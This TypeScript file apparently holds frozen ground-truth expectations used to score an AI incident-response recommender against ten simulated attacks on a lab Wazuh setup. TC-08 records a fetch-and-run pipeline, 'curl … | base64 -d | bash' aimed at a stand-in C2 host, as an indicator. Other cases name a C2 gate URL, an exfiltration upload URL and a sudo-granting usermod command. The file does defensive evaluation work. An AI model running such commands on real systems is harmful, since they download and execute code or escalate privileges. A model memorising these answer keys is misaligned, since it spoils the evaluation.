/**
 * groundTruthReal.ts — deterministic Expected/Allowed Recommendation for the REAL-WAZUH evaluation of
 * TC-01..TC-10. FROZEN BEFORE any alert is ingested and before any AI output exists; it is never derived from
 * a generated Recommendation and never edited to match one.
 *
 * Source of every value:
 *  - attack intent + allowed response  -> same test-case specification / Knowledge Base as groundTruth.ts
 *    (playbook.seed.ts allowedActions, mitre.seed.ts) — the allowed set and expected playbook are IDENTICAL to
 *    the mock ground truth for the same case, so MOCK and REAL_WAZUH results are comparable;
 *  - expected Wazuh rule / level / MITRE -> the stock Wazuh 4.9.2 ruleset (verified with wazuh-logtest and
 *    /var/ossec/ruleset/rules) or, where the stock ruleset has no rule, the custom rule in
 *    infra/docker/wazuh-manager/vigix_eval_rules.xml (reported as CUSTOM_RULE_CONTROLLED_TELEMETRY, never as
 *    a stock detection).
 *
 * REVISION NOTE (before the Clean Run, after a 1-case smoke test of the harness): @ATTEMPTED_USER was first a single
 * user; rule 5712 fires on the 8th failed attempt so the alert names whichever user was 8th. It now means "any of the
 * attempted users" (values joined with "|"). This corrects a mis-specified expectation from the simulation design; it
 * was not derived from, and does not depend on, any AI output. The smoke run is discarded.
 *
 * Values marked "@..." are environment facts resolved from the simulation context BEFORE the attack runs
 * (e.g. the attacker container's IP), see resolveGroundTruth().
 */
import { TcGroundTruth } from "./groundTruth";

export type RealMode = "STOCK_RULE" | "CUSTOM_RULE_REAL_ACTION" | "CUSTOM_RULE_CONTROLLED_TELEMETRY" | "ENVIRONMENT_UNAVAILABLE";

export interface RealTcGroundTruth extends TcGroundTruth {
  mode: RealMode;
  simulation: string;
  /** Wazuh alert the endpoint activity must raise. */
  expectedWazuh: { ruleId: string; level: number; stockRule: boolean };
  /** Preferred (primary) response action(s) — informational; compliance uses allowedActions. */
  expectedActions: string[];
  /** Acceptable evidence-backed targets for the preferred action (values or @placeholders). */
  expectedTargets: string[];
  expectedPolicy: string;
  expectedApproval: string;
  expectedVerification: string;
  environmentNote?: string;
  /** Machine-checkable evidence the simulation emits (values or @placeholders resolved from pre-attack facts). A field is
   *  null when the telemetry cannot honestly provide it; the reason is in evidenceLimits. Not derived from any AI output. */
  expectedEvidence?: { host: string; processName: string; processPath: string; commandLine: string; parentProcess: string | null; user: string; fileSha256: string | null; timestamp: string };
  evidenceLimits?: string[];
}

const APPROVAL = "IR_TEAM approval required (Policy POL-A01) before any containment; AI never approves";
const VERIFY = "REAL_WAZUH re-hunt of the Wazuh Indexer after manual response: RESOLVED only if matchingEvents=0, no spread, no IOC recurrence, threatContained";

export const REAL_GROUND_TRUTH: RealTcGroundTruth[] = [
  {
    caseId: "TC-01", ruleId: "5712", attackName: "Brute Force", attackType: "SSH_BRUTE_FORCE",
    mode: "STOCK_RULE", simulation: "10 invalid-user SSH logins with wrong passwords, attacker container -> attack-endpoint sshd",
    expectedWazuh: { ruleId: "5712", level: 10, stockRule: true },
    expectedSeverity: "medium", expectedMitre: ["T1110"],
    expectedIocs: [{ type: "ip", value: "@ATTACKER_IP" }, { type: "user", value: "@ATTEMPTED_USER" }],
    allowedActions: ["ACT-BLOCK-SOURCE-IP", "ACT-DISABLE-ACCOUNT"], expectedActions: ["ACT-BLOCK-SOURCE-IP"], expectedTargets: ["@ATTACKER_IP"],
    expectedPlaybook: "PB-SSH-BRUTEFORCE", approvalExpected: true, expectedPolicy: "POL-A01 approval; POL-A02/A03 action compliance", expectedApproval: APPROVAL, expectedVerification: VERIFY,
    knownFindings: [],
  },
  {
    caseId: "TC-02", ruleId: "100301", attackName: "Malware", attackType: "MALWARE",
    mode: "CUSTOM_RULE_REAL_ACTION", simulation: "EICAR test string written to /root/Downloads/Invoice_Q4_2026.xls.exe (real file, real FIM hash)",
    expectedWazuh: { ruleId: "100301", level: 12, stockRule: false },
    expectedSeverity: "high", expectedMitre: ["T1204.002"],
    expectedIocs: [{ type: "hash", value: "275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f" }, { type: "file", value: "/root/Downloads/Invoice_Q4_2026.xls.exe" }],
    allowedActions: ["ACT-ISOLATE-ENDPOINT", "ACT-BLOCK-DOMAIN", "ACT-BLOCK-URL", "ACT-BLOCK-SOURCE-IP", "ACT-KILL-PROCESS", "ACT-QUARANTINE-FILE", "ACT-BLOCK-HASH", "ACT-BLOCK-DESTINATION-IP"],
    expectedActions: ["ACT-QUARANTINE-FILE", "ACT-BLOCK-HASH"], expectedTargets: ["275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f", "/root/Downloads/Invoice_Q4_2026.xls.exe", "attack-endpoint"],
    expectedPlaybook: "PB-MALWARE", approvalExpected: true, expectedPolicy: "POL-A01 approval; impact-level policy for endpoint actions", expectedApproval: APPROVAL, expectedVerification: VERIFY,
    knownFindings: [],
  },
  {
    caseId: "TC-03", ruleId: "100310", attackName: "Phishing", attackType: "PHISHING",
    mode: "CUSTOM_RULE_CONTROLLED_TELEMETRY", simulation: "Controlled mail-gateway JSON event (no real e-mail, no real traffic): URL, domain, sender e-mail, sending MTA (RFC 5737 documentation IP)",
    expectedWazuh: { ruleId: "100310", level: 10, stockRule: false },
    expectedSeverity: "medium", expectedMitre: ["T1566.002"],
    expectedIocs: [{ type: "url", value: "http://vigix-eval-phish.net/o365/verify?id=hr.clerk" }, { type: "domain", value: "vigix-eval-phish.net" }, { type: "ip", value: "203.0.113.45" }, { type: "email", value: "it-support@vigix-eval-phish.net" }],
    allowedActions: ["ACT-QUARANTINE-EMAIL", "ACT-BLOCK-URL", "ACT-BLOCK-DOMAIN", "ACT-RESET-CREDENTIAL", "ACT-REVOKE-SESSION", "ACT-DISABLE-ACCOUNT", "ACT-ISOLATE-ENDPOINT"],
    expectedActions: ["ACT-BLOCK-URL", "ACT-BLOCK-DOMAIN", "ACT-QUARANTINE-EMAIL"], expectedTargets: ["http://vigix-eval-phish.net/o365/verify?id=hr.clerk", "vigix-eval-phish.net", "it-support@vigix-eval-phish.net"],
    expectedPlaybook: "PB-PHISHING", approvalExpected: true, expectedPolicy: "POL-A01 approval", expectedApproval: APPROVAL, expectedVerification: VERIFY,
    knownFindings: [],
    environmentNote: "ACT-QUARANTINE-EMAIL needs an evidence-backed EMAIL target; if the e-mail is not an IOC of the incident the case must be recorded as a finding/intervention, not silently repaired.",
  },
  {
    caseId: "TC-04", ruleId: "40112", attackName: "Account Compromise", attackType: "ACCOUNT_COMPROMISE",
    mode: "STOCK_RULE", simulation: "9 wrong-password SSH logins for user 'victim' then a successful login, attacker container -> attack-endpoint",
    expectedWazuh: { ruleId: "40112", level: 12, stockRule: true },
    expectedSeverity: "high", expectedMitre: ["T1078"],
    expectedIocs: [{ type: "ip", value: "@ATTACKER_IP" }, { type: "user", value: "victim" }],
    allowedActions: ["ACT-DISABLE-ACCOUNT", "ACT-BLOCK-SOURCE-IP", "ACT-ISOLATE-ENDPOINT", "ACT-RESET-CREDENTIAL", "ACT-REVOKE-SESSION"],
    expectedActions: ["ACT-DISABLE-ACCOUNT", "ACT-RESET-CREDENTIAL"], expectedTargets: ["victim", "@ATTACKER_IP"],
    expectedPlaybook: "PB-ACCOUNT-COMPROMISE", approvalExpected: true, expectedPolicy: "POL-A01 approval", expectedApproval: APPROVAL, expectedVerification: VERIFY,
    knownFindings: ["Stock rule 40112 asserts BOTH T1078 and T1110. PlaybookSelector ties (one technique each) and breaks the tie on fewest-listed-techniques, then code order; ground truth expects PB-ACCOUNT-COMPROMISE (attack intent = compromised account)."],
  },
  {
    caseId: "TC-05", ruleId: "100300", attackName: "PowerShell", attackType: "POWERSHELL",
    mode: "CUSTOM_RULE_REAL_ACTION",
    simulation: "REAL Windows 10 endpoint (Wazuh agent 4.9.2 + Sysmon): powershell.exe resolves the reserved-TLD lab name vigix-eval-ps-stager.test (DNS query only: nothing is downloaded or changed) -> Sysmon event 22 -> custom rule 100300",
    expectedWazuh: { ruleId: "100300", level: 12, stockRule: false },
    expectedSeverity: "high", expectedMitre: ["T1059.001"],
    expectedIocs: [{ type: "domain", value: "vigix-eval-ps-stager.test" }],
    allowedActions: ["ACT-ISOLATE-ENDPOINT", "ACT-BLOCK-DOMAIN", "ACT-BLOCK-URL", "ACT-BLOCK-SOURCE-IP", "ACT-DISABLE-ACCOUNT", "ACT-KILL-PROCESS", "ACT-QUARANTINE-FILE", "ACT-BLOCK-HASH"],
    expectedActions: ["ACT-BLOCK-DOMAIN"], expectedTargets: ["vigix-eval-ps-stager.test"],
    expectedPlaybook: "PB-POWERSHELL", approvalExpected: true,
    expectedPolicy: "RULE-P07 (severity HIGH) IR_TEAM approval; POL-A02 action compliance (BLOCK-DOMAIN)",
    expectedApproval: "IR_TEAM approval required (Policy RULE-P07, severity HIGH) before any containment; AI never approves",
    expectedVerification: VERIFY,
    knownFindings: [
      "REAL_WAZUH controlled scenario: the endpoint activity is real (Sysmon event 22 raised by powershell.exe) but the rule is a custom rule (100300) that matches this exact lab name; the stock ruleset has no rule for a PowerShell DNS query. Reported as CUSTOM_RULE_REAL_ACTION, never as a stock detection.",
      "The scenario proves PowerShell/DNS activity only. It does not prove that the endpoint was compromised, so ACT-ISOLATE-ENDPOINT is not an expected action (Correct Recommendation GT v3.3).",
      "Wazuh's eventchannel decoder doubles the backslashes inside data.win.eventdata.image and .user; the extractor reports them as stated.",
    ],
  },
  {
    caseId: "TC-06", ruleId: "31103", attackName: "SQL Injection", attackType: "SQL_INJECTION",
    mode: "STOCK_RULE", simulation: "12 lowercase-token SQLi GET requests (404) from the attacker container to the endpoint's nginx access log",
    expectedWazuh: { ruleId: "31103", level: 7, stockRule: true },
    expectedSeverity: "medium", expectedMitre: ["T1190"],
    expectedIocs: [{ type: "ip", value: "@ATTACKER_IP" }],
    allowedActions: ["ACT-BLOCK-SOURCE-IP"], expectedActions: ["ACT-BLOCK-SOURCE-IP"], expectedTargets: ["@ATTACKER_IP"],
    expectedPlaybook: "PB-SQL-INJECTION", approvalExpected: true, expectedPolicy: "POL-A01 approval", expectedApproval: APPROVAL, expectedVerification: VERIFY,
    knownFindings: [],
  },
  {
    caseId: "TC-07", ruleId: "100320", attackName: "Command & Control", attackType: "COMMAND_AND_CONTROL",
    mode: "CUSTOM_RULE_CONTROLLED_TELEMETRY", simulation: "3 real HTTP beacons endpoint -> isolated Docker test server (vigix-eval-c2.net mapped in the endpoint's /etc/hosts); JSON connection telemetry per beacon",
    expectedWazuh: { ruleId: "100320", level: 13, stockRule: false },
    expectedSeverity: "high", expectedMitre: ["T1071.001"],
    expectedIocs: [{ type: "domain", value: "vigix-eval-c2.net" }, { type: "url", value: "http://vigix-eval-c2.net:8080/gate.php" }, { type: "ip", value: "@TESTSERVER_IP" }],
    allowedActions: ["ACT-BLOCK-DESTINATION-IP", "ACT-BLOCK-DOMAIN", "ACT-BLOCK-URL", "ACT-ISOLATE-ENDPOINT"],
    expectedActions: ["ACT-BLOCK-DOMAIN", "ACT-BLOCK-DESTINATION-IP"], expectedTargets: ["vigix-eval-c2.net", "@TESTSERVER_IP"],
    expectedPlaybook: "PB-C2", approvalExpected: true, expectedPolicy: "POL-A01 approval", expectedApproval: APPROVAL, expectedVerification: VERIFY,
    knownFindings: [],
    environmentNote: "PB-C2 and T1071.001 were KB gaps in the earlier MOCK run (seeded then). They are checked as present BEFORE this run; if absent it is a finding, not a silent fix.",
  },
  {
    caseId: "TC-08", ruleId: "100330", attackName: "Suspicious Process", attackType: "SUSPICIOUS_PROCESS_EXECUTION",
    mode: "CUSTOM_RULE_CONTROLLED_TELEMETRY", simulation: "Real process /tmp/.cache/kworkerd (renamed sleep) as www-data plus a harmless 'curl | base64 -d | bash' pipeline against the test server; process telemetry read from /proc",
    expectedWazuh: { ruleId: "100330", level: 10, stockRule: false },
    expectedSeverity: "medium", expectedMitre: ["T1059.004"],
    expectedIocs: [{ type: "process", value: "/tmp/.cache/kworkerd" }, { type: "command", value: "curl -s http://vigix-eval-c2.net:8080/x | base64 -d | bash" }, { type: "file", value: "/tmp/.cache/kworkerd" }, { type: "hash", value: "@KWORKERD_SHA256" }],
    allowedActions: ["ACT-KILL-PROCESS", "ACT-QUARANTINE-FILE", "ACT-BLOCK-HASH", "ACT-ISOLATE-ENDPOINT"],
    expectedActions: ["ACT-KILL-PROCESS", "ACT-QUARANTINE-FILE"], expectedTargets: ["/tmp/.cache/kworkerd", "@KWORKERD_SHA256", "attack-endpoint"],
    expectedEvidence: { host: "attack-endpoint", processName: "kworkerd", processPath: "/tmp/.cache/kworkerd", commandLine: "curl -s http://vigix-eval-c2.net:8080/x | base64 -d | bash", parentProcess: null, user: "www-data", fileSha256: "@KWORKERD_SHA256", timestamp: "event timestamp (alert.timestamp)" },
    evidenceLimits: [
      "parentProcess is null in the specification: the parent of the detached (setsid) process is read from the endpoint at run time (data.audit.parent) and recorded in the simulation facts, but its value is not fixed in advance.",
      "commandLine is the parent shell pipeline; the process itself is 'sleep 40' renamed kworkerd (its own argv is not security-relevant).",
      "Process name / PID are only in data.audit.* (data.process is object-mapped in the Wazuh index, so a scalar data.process cannot be indexed); the IOC extractor does not read data.audit.* (PSI-2), so ACT-KILL-PROCESS has no PROCESS_NAME target unless extraction is extended or an analyst adds it.",
    ],
    expectedPlaybook: "PB-SUSPICIOUS-PROCESS", approvalExpected: true, expectedPolicy: "POL-A01 approval", expectedApproval: APPROVAL, expectedVerification: VERIFY,
    knownFindings: [],
    environmentNote: "ACT-KILL-PROCESS requires COMMAND_LINE evidence; a kill recommendation without a supported target/evidence must not appear.",
  },
  {
    caseId: "TC-09", ruleId: "100340", attackName: "Data Exfiltration", attackType: "DATA_EXFILTRATION",
    mode: "CUSTOM_RULE_CONTROLLED_TELEMETRY", simulation: "Synthetic 3 MB test-data.txt POSTed (real HTTP) to the isolated Docker test server (vigix-eval-exfil.net); body discarded by the sink; JSON transfer telemetry",
    expectedWazuh: { ruleId: "100340", level: 13, stockRule: false },
    expectedSeverity: "high", expectedMitre: ["T1048"],
    expectedIocs: [{ type: "domain", value: "vigix-eval-exfil.net" }, { type: "url", value: "http://vigix-eval-exfil.net:8080/upload" }, { type: "ip", value: "@TESTSERVER_IP" }],
    allowedActions: ["ACT-BLOCK-DESTINATION-IP", "ACT-BLOCK-DOMAIN", "ACT-BLOCK-URL", "ACT-ISOLATE-ENDPOINT"],
    expectedActions: ["ACT-BLOCK-DOMAIN", "ACT-BLOCK-DESTINATION-IP"], expectedTargets: ["vigix-eval-exfil.net", "@TESTSERVER_IP"],
    expectedPlaybook: "PB-DATA-EXFIL", approvalExpected: true, expectedPolicy: "POL-A01 approval", expectedApproval: APPROVAL, expectedVerification: VERIFY,
    knownFindings: [],
    environmentNote: "PB-DATA-EXFIL and T1048 were KB gaps in the earlier MOCK run; checked as present before this run.",
  },
  {
    // TC-10 (label "Privilege Escalation"): the alert asserts T1098 (Account Manipulation), which the backend
    // PlaybookSelector maps to PB-ACCOUNT-COMPROMISE (it lists T1098). Ground truth expects that playbook —
    // NOT PB-PRIV-ESC (T1068/T1548). Fixed here before the run; never changed to match a recommendation.
    caseId: "TC-10", ruleId: "100350", attackName: "Privilege Escalation", attackType: "ACCOUNT_COMPROMISE",
    mode: "CUSTOM_RULE_REAL_ACTION", simulation: "Real `useradd evaluser` then `usermod -aG sudo evaluser` on the endpoint; auth.log line decoded by the custom vigix-usermod decoder",
    expectedWazuh: { ruleId: "100350", level: 14, stockRule: false },
    expectedSeverity: "critical", expectedMitre: ["T1098"],
    expectedIocs: [{ type: "user", value: "evaluser" }],
    allowedActions: ["ACT-DISABLE-ACCOUNT", "ACT-BLOCK-SOURCE-IP", "ACT-ISOLATE-ENDPOINT", "ACT-RESET-CREDENTIAL", "ACT-REVOKE-SESSION"],
    expectedActions: ["ACT-DISABLE-ACCOUNT"], expectedTargets: ["evaluser"],
    expectedPlaybook: "PB-ACCOUNT-COMPROMISE", approvalExpected: true, expectedPolicy: "POL-A01 approval", expectedApproval: APPROVAL, expectedVerification: VERIFY,
    knownFindings: ["Stock Wazuh 4.9.2 has NO decoder/rule for `usermod -aG sudo` (only useradd 5902/T1136 and FIM 550 fire). Detection requires the custom rule 100350 — a ruleset gap, not a VIGIX defect."],
  },
];

export const realGroundTruthByCase = (caseId: string): RealTcGroundTruth | undefined => REAL_GROUND_TRUTH.find((g) => g.caseId === caseId);

/** Substitute "@NAME" placeholders with environment facts known BEFORE the attack (never AI output). */
export function resolveGroundTruth(gt: RealTcGroundTruth, ctx: Record<string, string>): RealTcGroundTruth {
  const sub = (v: string) => (v.startsWith("@") ? ctx[v.slice(1)] ?? v : v);
  return { ...gt, expectedIocs: gt.expectedIocs.map((i) => ({ ...i, value: sub(i.value) })), expectedTargets: gt.expectedTargets.map(sub), ...(gt.expectedEvidence ? { expectedEvidence: { ...gt.expectedEvidence, fileSha256: gt.expectedEvidence.fileSha256 ? sub(gt.expectedEvidence.fileSha256) : null } } : {}) };
}
